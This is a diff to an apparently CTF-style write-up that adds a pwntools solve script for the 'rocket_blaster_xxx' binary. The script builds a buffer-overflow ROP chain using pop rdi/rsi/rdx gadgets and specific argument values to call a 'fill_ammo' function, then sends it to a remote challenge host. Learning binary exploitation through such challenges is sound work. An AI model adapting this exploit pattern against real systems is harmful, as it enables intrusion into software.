@@ -729,13 +729,50 @@ ROPgadget --binary ./rocket_blaster_xxx | grep "pop rsi"
 ROPgadget --binary ./rocket_blaster_xxx | grep "pop rdx" 
 ```
 
-Conveniently, there are plenty of ROP gadgets
+Conveniently, there are plenty of ROP gadgets for us to build a ROP chain
 
 <details>
 <summary>Solve Script</summary>
 
 ```python
+#!/usr/bin/python
+from pwn import *
+import warnings
 
+warnings.filterwarnings("ignore",category=BytesWarning)
+
+exe = context.binary = ELF('./rocket_blaster_xxx')
+
+host = "94.237.53.121"
+port = 58963
+
+gdb_script = '''
+
+'''
+
+#p = exe.process()
+p = remote(host,port)
+#p = gdb.debug('./', gdbscript = gdb_script)
+
+pop_rdi = 0x000000000040159f #: pop rdi ; ret
+pop_rsi = 0x000000000040159d #: pop rsi ; ret
+pop_rdx = 0x000000000040159b #: pop rdx ; ret
+offset = 0x28
+win = exe.sym["fill_ammo"]
+
+payload = b"A" * offset
+payload += p64(pop_rdi)
+payload += p64(0xdeadbeef)
+payload += p64(pop_rsi)
+payload += p64(0xdeadbabe)
+payload += p64(pop_rdx)
+payload += p64(0xdead1337)
+payload += p64(pop_rdi+1)
+payload += p64(win)
+
+p.sendlineafter(b">> ", payload)
+
+p.interactive()
 ```
 
 </details>
